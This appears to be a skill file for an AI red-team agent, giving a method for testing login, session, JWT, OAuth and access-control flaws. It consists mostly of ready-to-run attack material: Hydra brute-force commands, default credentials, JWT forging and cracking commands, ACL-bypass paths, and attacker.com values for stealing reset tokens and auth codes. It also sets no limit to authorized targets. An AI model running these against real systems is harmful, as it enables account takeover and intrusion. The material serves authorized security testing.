---
name: auth-bypass
description: Test for authentication and authorization flaws including credential attacks, session issues, and access control bypasses
origin: RedteamOpencode
---

# Authentication & Authorization Bypass

## When to Activate

- Login/register/reset forms, protected resources, admin panels
- Token/session/API key auth, role-based access, JWT/OAuth

## Authentication Testing

### 1. Default/Weak Credentials
```
admin:admin  admin:password  admin:123456  root:root  root:toor  test:test  guest:guest
```
Check username enumeration: different errors for valid/invalid users, timing diffs, selective lockout.

### 2. Brute Force (Hydra)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
hydra -l admin -P /usr/share/wordlists/rockyou.txt target http-get /admin
hydra -l root -P passwords.txt target ssh -t 4
# Rate-limited: -t 1 -W 5
```

### 3. Password Reset Flaws
- Predictable/reusable/non-expiring tokens, token not tied to account
- Host header injection: `Host: attacker.com` in reset request
- Parameter pollution: `email=victim@mail.com&email=attacker@mail.com`

### 4. Session Management
- Session fixation: force token onto victim, use after auth
- Token analysis: collect 20+ tokens, check entropy/predictability/sequential patterns
- Invalidation: test logout, password change
- Cookie flags: check HttpOnly, Secure, SameSite, Domain/Path scope

### 5. MFA Bypass
- Direct navigation to post-auth pages, code brute-force (no rate limit), code reuse
- Response manipulation (`"success":false` → `true`), backup code enumeration
- MFA not enforced on all auth paths, disable without re-auth

## Authorization Testing

### 1. IDOR
```
GET /api/user/1001/profile → /api/user/1002/profile    # Horizontal
GET /invoice?id=5001 → ?id=5002
# Test: sequential IDs, leaked UUIDs, Base64 decode/modify/re-encode
# param pollution: ?id=1001&id=1002, method swap: GET→PUT/DELETE
# Vertical: regular user → admin endpoints
```

### 2. Forced Browsing
```
/admin  /admin/dashboard  /console  /debug  /internal  /api/admin/users  /graphql
```
Check if 302 redirect body contains protected content (curl without -L).

### 3. HTTP Method Tampering
```
GET /admin/delete → 403, POST /admin/delete → 200
# Override headers: X-HTTP-Method-Override, X-Method-Override, X-Original-Method
```

### 4. Path Traversal for ACL Bypass
```
/admin→403  /ADMIN→200  /admin/→200  /./admin→200  /admin;.js→200
/%2fadmin→200  /admin%20→200  /admin..;/→200 (Tomcat/Spring)
```

### 5. JWT Attacks
```bash
# Decode: echo "HEADER_B64" | base64 -d
# None algorithm: {"alg":"none"}, remove signature → HEADER.PAYLOAD.
# Weak secret: hashcat -a 0 -m 16500 jwt.txt rockyou.txt
# Payload: change role/sub/exp claims
# Key injection: kid="../../dev/null" → sign with empty secret
# jku: point to attacker JWK set URL
jwt_tool TOKEN -T                  # Tamper
jwt_tool TOKEN -C -d wordlist.txt  # Crack
```

### 6. OAuth/SSO Flaws
- Open redirect in redirect_uri (steal auth code): `redirect_uri=https://attacker.com`
- Missing state param (CSRF), token leakage via Referer, scope escalation

### 7. Role/Privilege Manipulation
```
POST /register {"username":"test","password":"test","role":"admin"}
PUT /api/profile {"name":"test","role":"admin","is_staff":true}  # Mass assignment
# Trust headers: X-Forwarded-For: 127.0.0.1, X-Original-URL: /admin
```

## Methodology Checklist

1. Map all auth endpoints (login, register, reset, logout, MFA, OAuth)
2. Create accounts at each privilege level
3. Test each privileged action with lower/no-auth sessions
4. Swap tokens between privilege levels
5. Test every object reference with other accounts' IDs
6. Check JWT/token security
7. Test session lifecycle: fixation, expiration, invalidation
